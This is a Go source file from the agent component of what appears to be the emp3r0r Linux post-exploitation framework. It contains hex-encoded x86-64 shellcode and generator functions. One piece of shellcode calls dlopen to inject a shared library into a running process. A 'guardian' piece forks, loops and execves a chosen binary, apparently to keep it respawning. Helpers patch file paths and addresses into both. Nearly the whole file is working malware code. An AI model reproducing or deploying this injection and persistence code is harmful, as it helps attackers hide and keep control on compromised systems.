//go:build linux
// +build linux

package agent

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var (
	dlopen_shellcode = "31f0" + "31ff" + "31f6" +
		"31d2" + "31c9" + "31db" + // clear rax, rdi, rsi
		"57" + // push rdi '\0'
		// filename is path to loader.so
		// to be replaced with
		// movabs rdi, 0xdeadbeefdeadbeef; push rdi
		// opcode is 48bfdeadbeefdeadbeef; 57
		"filename" +
		// "cc" + // int3
		"40b602" + // mov sil, 2; mode=2
		"48b830d9320c047f0000" +
		// "cc" + // int3
		"ffd0" + // movabs rax, 0x7f040c32d930; call rax
		"cc" // int3

		// GuardianShellcode
		/*
		   0x00000000   2                     31c0  xor eax, eax
		   0x00000002   2                     31ff  xor edi, edi
		   0x00000004   2                     b039  mov al, 0x39
		   0x00000006   2                     0f05  syscall
		   0x00000008   4                 4883f800  cmp rax, 0
		   0x0000000c   2                     7f44  jg 0x52
		   0x0000000e   2                     31c0  xor eax, eax
		   0x00000010   2                     31ff  xor edi, edi
		   0x00000012   2                     b039  mov al, 0x39
		   0x00000014   2                     0f05  syscall
		   0x00000016   4                 4883f800  cmp rax, 0
		   0x0000001a   2                     7425  je 0x41
		   0x0000001c   2                     31ff  xor edi, edi
		   0x0000001e   3                   4889c7  mov rdi, rax
		   0x00000021   2                     31f6  xor esi, esi
		   0x00000023   2                     31d2  xor edx, edx
		   0x00000025   3                   4d31d2  xor r10, r10
		   0x00000028   2                     31c0  xor eax, eax
		   0x0000002a   2                     b03d  mov al, 0x3d
		   0x0000002c   2                     0f05  syscall
		   0x0000002e   2                     31c0  xor eax, eax
		   0x00000030   2                     b023  mov al, 0x23
		   0x00000032   2                     6a0a  push 0xa
		   0x00000034   2                     6a14  push 0x14
		   0x00000036   3                   4889e7  mov rdi, rsp
		   0x00000039   2                     31f6  xor esi, esi
		   0x0000003b   2                     31d2  xor edx, edx
		   0x0000003d   2                     0f05  syscall
		   0x0000003f   2                     e2cd  loop 0xe
		   0x00000041   2                     31d2  xor edx, edx
		   0x00000043   2                     31c0  xor eax, eax
		   0x00000045   1                       52  push rdx
		   0x00000046   1                       cc  int3
		   0x00000047   1                       52  push rdx
		   0x00000048   1                       57  push rdi
		   0x00000049   3                   4889e6  mov rsi, rsp
		   0x0000004c   2                     6a3b  push 0x3b
		   0x0000004e   1                       58  pop rax
		   0x0000004f   1                       99  cdq
		   0x00000050   2                     0f05  syscall
		   0x00000052   1                       cc  int3
		*/
	guardian_shellcode = "31c031ffb0390f054883f8007f4431c031ffb0390f054883f800742531ff4889c731f631d24d31d231c0b03d0f0531c0b0236a0a6a144889e731f631d20f05e2cd31d231c052" + "filename" +
		"52574889e66a3b58990f05cc"
)

// path: eg. /usr/bin/ps
func gen_guardian_shellcode(path string) (shellcode string) {
	push_filename_hex := push_filename_asm(path)
	if push_filename_hex == "" {
		log.Printf("push_filename_asm failed")
		return
	}

	shellcode = strings.ReplaceAll(guardian_shellcode, "filename", push_filename_hex)
	log.Printf("gen_guardian_shellcode:\n%s", shellcode)

	return
}

// dlopen_addr: eg. 30d9320c047f
// path: eg. /usr/lib/x86_64-linux-gnu/libc++.so.1
func gen_dlopen_shellcode(path string, dlopen_addr int64) (shellcode string) {
	b := make([]byte, 8)
	binary.LittleEndian.PutUint64(b, uint64(dlopen_addr))
	dlopen_addr_hex := hex.EncodeToString(b)
	push_filename_hex := push_filename_asm(path)
	if push_filename_hex == "" {
		log.Printf("push_filename_asm failed")
		return
	}

	s1 := strings.ReplaceAll(dlopen_shellcode, "filename", push_filename_hex)
	shellcode = strings.ReplaceAll(s1, "30d9320c047f0000", dlopen_addr_hex)
	log.Printf("gen_dlopen_shellcode:\n%s", shellcode)

	return
}

// generates instructions that pushes filename to stack
// and assign to rdi as function parameter
func push_filename_asm(path string) (ret_hex string) {
	push_count := 1 // because we pushed rdi at the beginning
	path_hex := ""
	if len(path) <= 8 {
		path_hex = hex.EncodeToString([]byte(path))
		ret_hex = "48bf" + path_hex + "57" // movabs rdi, so_path_hex; push rdi
		ret_hex += "4889e7"                // mov rdi, rsp

	} else {
		path_str := "" // hex string can't be easily reversed
		for _, char := range util.ReverseString(path) {
			c := string(char)
			if len(path_str) == 8 {
				r := util.ReverseString(path_str)
				path_hex = hex.EncodeToString([]byte(r))
				ret_hex += "48bf" + path_hex + "57" // movabs rdi, path_hex; push rdi
				path_str = ""
				push_count += 1 // one more push
			}
			path_str += c
		}

		// remaining chars
		r := util.ReverseString(path_str)
		path_hex = hex.EncodeToString([]byte(r))
	}

	defer func() {
		// make push_count % 2 == 0
		if push_count%2 != 0 {
			ret_hex += "57" // push rdi
		}
	}()

	// pad the remaining bytes
	if len(path_hex)/2 < 8 {
		padding := 8 - len(path_hex)/2     // number of paddings using NULL
		padding_b := []byte{byte(padding)} // number of NULLs used for padding, in hex format
		path_hex = fmt.Sprintf("%s%s", strings.Repeat("00", padding), path_hex)

		// resulting assembly
		ret_hex += "48bf" + path_hex + "57"                               // mov rdi, string; push rdi
		ret_hex += fmt.Sprintf("4883c4%s", hex.EncodeToString(padding_b)) // add rsp, padding
		ret_hex += "4889e7"                                               // mov rdi, rsp
		ret_hex += fmt.Sprintf("4883ec%s", hex.EncodeToString(padding_b)) // sub rsp, padding

		// balance stack
		push_count += 1
		return
	}
	ret_hex += "4889e7" // mov rdi, rsp

	return
}
